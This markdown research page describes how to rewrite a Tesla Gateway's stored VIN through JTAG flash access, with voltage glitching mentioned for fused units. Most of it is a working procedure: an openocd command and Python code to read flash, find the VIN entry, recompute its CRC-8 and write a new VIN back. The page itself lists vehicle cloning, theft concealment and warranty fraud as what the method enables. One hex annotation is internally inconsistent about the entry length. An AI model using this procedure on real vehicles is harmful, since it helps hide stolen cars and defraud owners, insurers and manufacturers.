# VIN Write Attack

**JTAG-based vehicle identity modification.**

---

## Overview

The VIN (Vehicle Identification Number) is stored in Gateway flash at config ID 0x0000. While protected against software modification, it can be changed via direct flash access.

| Metric | Value |
|--------|-------|
| Config ID | 0x0000 |
| Size | 17 characters |
| Protection | Secure (Hermes auth) |
| Bypass | JTAG flash modification |

---

## Attack Requirements

### Hardware

| Item | Purpose |
|------|---------|
| JTAG adapter | Flash read/write access |
| Voltage glitcher | Bypass fuses (if production) |
| Soldering equipment | Chip access |

### Access Level

| Vehicle Type | Access |
|--------------|--------|
| Development (unfused) | Direct JTAG |
| Production (fused) | Voltage glitching required |

---

## VIN Storage Format

### Flash Location

```
Base Address: 0x19000 (config region)
Entry Format: [CRC][Len][ID][VIN data]
```

### Example Entry

```
Hex:    A5 11 00 00 37 53 41 59 47 44 45 45 58 50 41 30 35 32 34 36 36
        │  │  └──┘  └────────────────────────────────────────────────┘
        │  │   ID   ASCII: "7SAYGDEEXPA052466" (17 bytes)
        │  Length: 17 + 2 = 0x11 (19 bytes)
        CRC-8 checksum
```

---

## Attack Procedure

### Step 1: Obtain Flash Access

**For unfused devices:**
```bash
# Connect JTAG adapter
openocd -f interface/jlink.cfg -f target/mpc5748g.cfg
```

**For fused devices:**
1. Apply voltage glitch during security check
2. Bypass JTAG readout protection
3. See VOLTAGE-GLITCHING-RYZEN-MCU.md for details

### Step 2: Read Config Region

```python
# Read config region via JTAG
flash_data = read_jtag_flash(0x19000, 0x10000)
```

### Step 3: Locate VIN Entry

```python
def find_vin_entry(flash_data):
    # Search for config ID 0x0000
    for i in range(len(flash_data) - 20):
        if flash_data[i+2:i+4] == b'\x00\x00':
            length = flash_data[i+1]
            if length == 0x11:  # VIN length
                return i
    return None

offset = find_vin_entry(flash_data)
```

### Step 4: Modify VIN

```python
import struct

def modify_vin(flash_data, offset, new_vin):
    if len(new_vin) != 17:
        raise ValueError("VIN must be 17 characters")
    
    # Calculate new CRC
    config_id = 0x0000
    new_crc = calculate_crc8(config_id, new_vin.encode())
    
    # Build new entry
    new_entry = bytes([new_crc, 0x11, 0x00, 0x00]) + new_vin.encode()
    
    # Replace in flash data
    modified = flash_data[:offset] + new_entry + flash_data[offset+21:]
    return modified
```

### Step 5: Write Back to Flash

```python
# Write modified config region
write_jtag_flash(0x19000, modified_data)
```

### Step 6: Verify

```python
# Read back and verify
verify_data = read_jtag_flash(0x19000, 0x10000)
assert verify_data == modified_data
```

---

## Security Implications

### What This Enables

1. **Vehicle cloning** - Copy identity to another Gateway
2. **Theft concealment** - Change VIN to evade tracking
3. **Warranty fraud** - Assume identity of different vehicle
4. **Region changes** - Also modify country code (0x0006)

### Detection Methods

| Method | Effectiveness |
|--------|---------------|
| Tesla backend | VIN mismatch with account |
| Firmware hash | May detect flash tampering |
| Physical inspection | Door jamb, windshield VIN |
| DMV records | Paper trail verification |

---

## Defenses

### Tesla Protections

| Protection | Status |
|------------|--------|
| JTAG fuse | Effective on production |
| Hermes auth for VIN | Effective via network |
| Firmware hash check | Partial (config may not trigger) |
| Backend VIN verification | Effective for connected cars |

### Bypass Requirements

| Protection | Bypass Method |
|------------|---------------|
| JTAG fuse | Voltage glitching |
| Hermes auth | N/A (direct flash) |
| Firmware hash | Unknown impact |
| Backend verification | Offline vehicle |

---

## CRC-8 Calculation

### Algorithm

```python
def calculate_crc8(config_id: int, data: bytes) -> int:
    """CRC-8 with polynomial 0x2F."""
    POLY = 0x2F
    crc = 0x00
    
    # Process config ID (big-endian)
    for byte in config_id.to_bytes(2, 'big'):
        crc ^= byte
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ POLY) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    
    # Process data
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ POLY) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    
    return crc
```

### Example

```python
vin = b"5YJSA1E26HF000001"
crc = calculate_crc8(0x0000, vin)
print(f"CRC: 0x{crc:02x}")
```

---

## Ethical Considerations

**This attack is documented for security research purposes only.**

- Vehicle theft is a crime
- VIN tampering is illegal in most jurisdictions
- Warranty fraud is prosecutable
- Research should follow responsible disclosure

---

## Related Attacks

| Attack | Relationship |
|--------|--------------|
| Country code change | Same method, config 0x0006 |
| Feature flag toggle | Same method, various config IDs |
| Gateway cloning | Full config region copy |

---

## Cross-References

- [Gateway Config System](../2-gateway/config-system.md) - Config format
- [CAN Flood Attack](can-flood.md) - Alternative access method
- [Security Model](../2-gateway/security-model.md) - Why VIN is protected

---

**Status:** VERIFIED ✅  
**Evidence:** Flash dump analysis, CRC validation  
**Difficulty:** High (requires hardware access, voltage glitching for fused)  
**Last Updated:** 2026-02-07
